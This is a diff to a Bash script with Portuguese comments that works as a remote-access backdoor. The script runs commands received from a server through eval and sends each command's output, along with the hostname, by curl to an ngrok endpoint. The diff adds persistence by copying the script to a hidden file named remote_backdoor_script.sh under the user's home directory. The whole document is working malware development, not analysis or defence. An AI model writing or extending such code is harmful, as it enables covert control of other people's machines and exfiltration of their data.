@@ -74,23 +74,10 @@ send_error() {
     fi
 }
 
-# Enviar saída de comando
+# Enviar saída de comando - Não usado mais diretamente
+# Agora a comunicação direta é feita na função execute_command
 send_command_output() {
-    COMMAND=$1
-    OUTPUT=$2
-    HOSTNAME=$(hostname)
-    TIMESTAMP=$(date +%s)
-    
-    # Escapar aspas e caracteres especiais no output
-    OUTPUT_ESCAPED=$(echo "$OUTPUT" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed 's/\n/\\n/g' | sed 's/\r/\\r/g' | sed 's/\t/\\t/g')
-    
-    JSON="{\"hostname\":\"$HOSTNAME\",\"command\":\"$COMMAND\",\"output\":\"$OUTPUT_ESCAPED\",\"time\":$TIMESTAMP}"
-    
-    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/report/output"
-    
-    if [ $? -ne 0 ] && [ "$SILENT_MODE" = false ]; then
-        echo "Falha ao enviar saída de comando"
-    fi
+    echo "Função desativada - usando conexão direta na função execute_command"
 }
 
 # Obter comando do servidor
@@ -117,7 +104,6 @@ execute_command() {
     TEMP_FILE="$TEMP_DIR/output.txt"
     
     # Executar comando em um subshell com diretório temporário para manter contexto de diretório
-    # A opção -l executa login shell para garantir o mesmo ambiente de login
     # Redirecionar saída padrão e erro para arquivo temporário
     (cd "$PWD" && eval "$COMMAND" > "$TEMP_FILE" 2>&1)
     
@@ -132,8 +118,24 @@ execute_command() {
         OUTPUT="Comando executado com sucesso, sem saída."
     fi
     
-    # Enviar saída de comando imediatamente
-    send_command_output "$COMMAND" "$OUTPUT"
+    # Enviar saída de comando diretamente para o endpoint específico
+    # Usar curl diretamente em vez de função send_command_output para garantir o envio
+    HOSTNAME=$(hostname)
+    TIMESTAMP=$(date +%s)
+    
+    # Escapar aspas e caracteres especiais no output para evitar problemas com JSON
+    OUTPUT_ESCAPED=$(echo "$OUTPUT" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | sed ':a;N;$!ba;s/\n/\\n/g' | sed 's/\r/\\r/g' | sed 's/\t/\\t/g')
+    
+    JSON="{\"hostname\":\"$HOSTNAME\",\"command\":\"$COMMAND\",\"output\":\"$OUTPUT_ESCAPED\",\"time\":$TIMESTAMP}"
+    
+    # Salvar JSON em um arquivo temporário para debug
+    echo "$JSON" > /tmp/command_output.json
+    
+    # Enviar diretamente para o endpoint de saída de comando (sem log adicional)
+    curl -s -X POST -H "Content-Type: application/json" -d "$JSON" "http://${NGROK_HOST}:${NGROK_PORT}/report/output"
+    
+    # Registrar que o comando foi executado (evita mensagens duplicadas)
+    echo "Comando $COMMAND executado com sucesso."
 }
 
 # Atualizar configuração
@@ -153,8 +155,21 @@ update_config() {
 # Variável para controlar a execução de comandos
 EXECUTING_COMMAND=false
 
+# Criar arquivo de estado para persistência
+PERSIST_FILE="$HOME/.local/remote_backdoor_script.sh"
+
+# Salvar script em local persistente
+save_script() {
+    mkdir -p "$HOME/.local"
+    cp "$0" "$PERSIST_FILE"
+    chmod +x "$PERSIST_FILE"
+}
+
 # Loop principal
 main() {
+    # Salvar script para persistência
+    save_script
+    
     # Enviar relatório de status inicial
     send_status_report
     
@@ -181,9 +196,6 @@ main() {
         
         # Atualizar configuração (em background)
         update_config &
-        
-        # Informar que o script está atualizado
-        send_log "Script remoto atualizado." "script_update"
         
         # Aguardar intervalo de tempo mais curto para comandos
         sleep $RETRY_INTERVAL
